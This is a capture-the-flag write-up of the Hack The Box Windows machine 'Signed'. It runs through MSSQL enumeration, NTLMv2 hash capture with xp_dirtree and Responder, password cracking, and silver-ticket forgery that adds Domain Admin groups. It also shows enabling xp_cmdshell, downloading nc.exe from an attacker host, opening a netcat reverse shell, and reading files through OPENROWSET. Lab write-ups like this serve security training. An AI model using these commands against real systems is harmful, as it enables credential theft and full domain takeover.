---
layout: post
title: "[HTB] Signed"
description: "[Machine] - Medium difficulty"
background: /img/bg-machine.jpg
tags:
  - htb
difficulty: Medium
---

![](/img/htb_img/Signed_img/img1.png)

- OS: Windows
- Release Date: 11 Oct 2025
- Difficulty: Medium

<br>

# Enumeration
## Nmap recon
```
❯ sudo nmap -p- --min-rate 5000 --open -sS -n -Pn -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-18 21:49 CEST
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 63.37% done; ETC: 21:49 (0:00:09 remaining)
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 69.86% done; ETC: 21:49 (0:00:08 remaining)
Nmap scan report for 10.129.xx.xx
Host is up (0.095s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
1433/tcp open  ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 39.67 seconds
```

Scripts and versions.
```
❯ nmap -p1433 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-18 21:50 CEST
Nmap scan report for 10.129.xx.xx
Host is up (0.095s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.xx.xx:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.xx.xx:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-18T10:24:53
|_Not valid after:  2055-10-18T10:24:53
|_ssl-date: 2025-10-18T13:18:17+00:00; -6h32m10s from scanner time.

Host script results:
|_clock-skew: mean: -6h32m10s, deviation: 0s, median: -6h32m10s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.31 seconds
```

```
❯ echo "$target DC01.SIGNED.HTB SIGNED.HTB" | sudo tee -a /etc/hosts
10.129.xx.xx DC01.SIGNED.HTB SIGNED.HTB
```
# TCP 1433: MSSQL
We try logging in to the MSSQL console.
```
❯ impacket-mssqlclient signed.htb/scott:'Sm230#C5NatH'@$target
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (scott  guest@master)>
```

It works, but we can't enable xp_cmdshell.
```
SQL (scott  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

## Users enumeration
```
SQL (scott  guest@master)> enum_users
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
------------------   --------   ---------   ---------   -------------   ----------   -----   
dbo                  db_owner   sa          master      dbo             b'1         '   b'01'

guest                public     NULL        NULL        guest           b'2         '   b'00'

INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL

sys                  public     NULL        NULL        NULL            b'4         '    NULL

SQL (scott  guest@master)> 
```
`dbo` is mapped to the `sa` login as db_owner.

## Capturing NTLM hash with a responder
```
❯ sudo responder -I tun0 -v

SQL (scott  guest@master)> xp_dirtree \\10.10.xx.xx\asdasd

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.xx.xx
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:01f56cc2213720cc:DCF2BB7F882211683B61A438E3BA835B:010100000000000080AF0D2A7A40DC01EFAE67715D2224310000000002000800310059004100370001001E00570049004E002D004600480052005A0038003300440042004F004C00480004003400570049004E002D004600480052005A0038003300440042004F004C0048002E0031005900410037002E004C004F00430041004C000300140031005900410037002E004C004F00430041004C000500140031005900410037002E004C004F00430041004C000700080080AF0D2A7A40DC010600040002000000080030003000000000000000000000000030000005D9FFEA9C9DCFCA65054641F319361754F11FA8EFBFB4DAC05098C938AC39850A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390037000000000000000000
```

### Cracking the hash
```
❯ sudo john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)     
1g 0:00:00:01 DONE (2025-10-18 21:58) 0.5181g/s 2325Kp/s 2325Kc/s 2325KC/s purcitititya..pupe066505878
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
`mssqlsvc` / `purPLE9795!@`

## MSSQL with mssqlsvc
```
❯ impacket-mssqlclient signed.htb/mssqlsvc:'purPLE9795!@'@$target -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)>
```

### Checking sysadmin role users
```
SQL (SIGNED\mssqlsvc  guest@master)> SELECT r.name AS role, m.name AS member FROM sys.server_principals r JOIN sys.server_role_members rm ON r.principal_id=rm.role_principal_id JOIN sys.server_principals m ON rm.member_principal_id=m.principal_id WHERE r.name='sysadmin';
role       member                      
--------   -------------------------   
sysadmin   sa                          

sysadmin   SIGNED\IT                   

sysadmin   NT SERVICE\SQLWriter        

sysadmin   NT SERVICE\Winmgmt          

sysadmin   NT SERVICE\MSSQLSERVER      

sysadmin   NT SERVICE\SQLSERVERAGENT   

SQL (SIGNED\mssqlsvc  guest@master)>
```

# Foothold
## Silver ticket attack
We need some things beforehand.
```
SQL (SIGNED\mssqlsvc  guest@master)> select DEFAULT_DOMAIN() as mydomain;
mydomain   
--------   
SIGNED

SQL (SIGNED\mssqlsvc  guest@master)> select SUSER_SID('SIGNED\IT')
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
```

Decoding it gives us the SID group:
```
# Decoding this leads to the following SID:
SID S-1-5-21-4088429403-1159899800-2753317549-1105 # The 1105 is the SID group

```

Now for the mssqlsvc user:
```
SQL (SIGNED\mssqlsvc  guest@master)> select SUSER_SID('SIGNED\mssqlsvc')
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'

# SID 1103 for the user
# SID S-1-5-21-4088429403-1159899800-2753317549-1103
```

### Calculating the NTLM Hash for the silver ticket
```
❯ iconv -f ASCII -t UTF-16LE <(printf 'purPLE9795!@') | openssl dgst -md4
MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc
```
Hash: `ef699384c3285c54128a3ee1ddb1a0cc`

### Creating the silver ticket
```
❯ impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 -user-id 1103 mssqlsvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

```
❯ export KRB5CCNAME=mssqlsvc.ccache; impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB -dc-ip $target
/home/kali/PyEnv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)>
```

Now we are logged in as `dbo`, and we can enable xp_cmdshell.
```
SQL (SIGNED\mssqlsvc  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "powershell wget -UseBasicParsing http://10.10.xx.xx/nc.exe -OutFile %temp%/nc.exe"
output   
------   
NULL
```

After downloading our nc.exe, we can generate a reverse shell.

### Reverse shell
```
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell %temp%\nc.exe -nv 10.10.xx.xx 4444 -e cmd.exe
```

```
❯ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.129.xx.xx] 63814
Microsoft Windows [Version 10.0.17763.7314]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
signed\mssqlsvc

C:\Windows\system32>
```

#### User flag
```
C:\Users\mssqlsvc\Desktop>type user.txt
type user.txt
<REDACTED>
```

# Privilege Escalation
We can get the root flag with OPENROWSET, but we need Domain Admins (RID 512) and Enterprise Admins (RID 519), doing the same as before.
```
SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\Domain Admins');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca400020000'
#  S-1-5-21-4088429403-1159899800-2753317549-512
# 512

SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\Enterprise Admins');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca407020000'
#  S-1-5-21-4088429403-1159899800-2753317549-519
# 519
```

## Silver ticket premium
```
❯ impacket-ticketer -nthash EF699384C3285C54128A3EE1DDB1A0CC -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -spn MSSQLSvc/DC01.SIGNED.HTB -groups 512,519,1105 -user-id 1103 mssqlsvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.HTB/mssqlsvc
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
❯ export KRB5CCNAME=mssqlsvc.ccache; impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB -dc-ip $target
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)>
```

Advanced configurations:
```
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
SQL (SIGNED\mssqlsvc  dbo@master)>
```

Enable OPENROWSET:
```
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
INFO(DC01): Line 196: Configuration option 'Ad Hoc Distributed Queries' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
```

### Root flag
```
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;
BulkColumn                                
---------------------------------------   
b'<REDACTED>\r\n'
```